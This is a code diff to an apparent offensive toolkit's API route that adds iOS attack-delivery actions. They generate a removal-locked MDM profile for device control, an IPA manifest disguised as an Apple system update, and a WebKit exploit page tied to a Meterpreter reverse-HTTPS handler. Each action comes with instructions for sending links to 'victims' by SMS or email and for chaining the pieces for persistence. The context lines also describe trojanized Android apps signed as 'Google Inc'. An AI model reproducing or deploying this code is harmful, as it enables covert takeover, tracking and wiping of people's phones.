@@ -14,6 +14,7 @@
 
 import { NextResponse } from "next/server";
 import { getRpcToken, rpcCall } from "@/lib/msf-rpc";
+import { generateMdmProfile, generateManifest, buildWebkitExploitHtml } from "@/lib/ios-delivery";
 import path from "path";
 import fs from "fs";
 import os from "os";
@@ -447,6 +448,88 @@ rm -rf "$WORK_DIR"
             "  → Script decompiles both, injects smali payload class, repackages & signs",
             "  → Victim installs normal app that also runs Meterpreter in background",
             "Signing key uses CN=Google Inc to appear more legitimate",
+          ],
+        },
+      });
+    }
+
+    // ── iOS MDM profile (.mobileconfig) ───────────────────────
+    if (action === "ios_mdm") {
+      const server = String(body.mdm_server ?? `https://${lhost}`);
+      const org = String(body.mdm_org ?? "IT Department");
+      const profileName = String(body.mdm_profile ?? decoy_title);
+      const xml = generateMdmProfile({ server, org, profileName, removalLock: true });
+      const fname = `${String(decoy_title).replace(/\s+/g, "_")}_${uid}.mobileconfig`;
+      const outPath = path.join(OUT_DIR, fname);
+      fs.writeFileSync(outPath, xml);
+      const enrollUrl = `${server}/enroll`;
+      return NextResponse.json({
+        ok: true,
+        data: {
+          path: outPath,
+          filename: fname,
+          size: fs.statSync(outPath).size,
+          deliveryUrl: enrollUrl,
+          note: "Host with Content-Type: application/x-apple-aspen-config. Works iOS 14–18, no jailbreak. Victim: Safari → Install (2 taps).",
+          instructions: [
+            `Host profile at ${enrollUrl}`,
+            "Send URL to victim (email/SMS/social)",
+            "Victim: Settings → General → VPN & Device Management → Install",
+            "MDM channel: location, wipe, app install, VPN push, CA cert",
+          ],
+        },
+      });
+    }
+
+    // ── iOS IPA manifest (TrollStore / enterprise OTA) ───────
+    if (action === "ios_ipa") {
+      const server = String(body.ios_server ?? `https://${lhost}`);
+      const appName = String(body.app_name ?? decoy_title);
+      const bundleId = String(body.bundle_id ?? "com.apple.system.update");
+      const version = String(body.app_version ?? "1.0.0");
+      const manifest = generateManifest({ server, appName, bundleId, version });
+      const manifestName = `manifest_${uid}.plist`;
+      const manifestPath = path.join(OUT_DIR, manifestName);
+      fs.writeFileSync(manifestPath, manifest);
+      const deliveryUrl = `itms-services://?action=download-manifest&url=${server}/manifest.plist`;
+      return NextResponse.json({
+        ok: true,
+        data: {
+          path: manifestPath,
+          filename: manifestName,
+          size: fs.statSync(manifestPath).size,
+          deliveryUrl,
+          note: "TrollStore (iOS 14–17.0b4) or enterprise cert. Host manifest.plist + app.ipa on HTTPS.",
+          instructions: [
+            `Copy manifest to ${server}/manifest.plist`,
+            `Host IPA at ${server}/payload/app.ipa`,
+            `Delivery URL: ${deliveryUrl}`,
+            "TrollStore: victim taps IPA link → Install permanently",
+          ],
+        },
+      });
+    }
+
+    // ── iOS WebKit exploit page ───────────────────────────────
+    if (action === "ios_webkit") {
+      const cve = String(body.webkit_cve ?? "CVE-2024-44308");
+      const html = buildWebkitExploitHtml({ cve, lhost: String(lhost), lport: String(lport) });
+      const htmlName = `exploit_${uid}.html`;
+      const htmlPath = path.join(OUT_DIR, htmlName);
+      fs.writeFileSync(htmlPath, html);
+      return NextResponse.json({
+        ok: true,
+        data: {
+          path: htmlPath,
+          filename: htmlName,
+          size: fs.statSync(htmlPath).size,
+          deliveryUrl: `https://${lhost}/exploit.html`,
+          note: `${cve} — Safari/WebView one-click. Zero-click variants: CVE-2021-30860, CVE-2023-41064 via iMessage.`,
+          instructions: [
+            `Host at https://${lhost}/exploit.html (HTTPS required)`,
+            `MSF: use multi/handler; set PAYLOAD apple_ios/aarch64/meterpreter_reverse_https`,
+            "Send URL via SMS/email — victim opens in Safari",
+            "Chain with MDM profile install post-RCE for persistence",
           ],
         },
       });
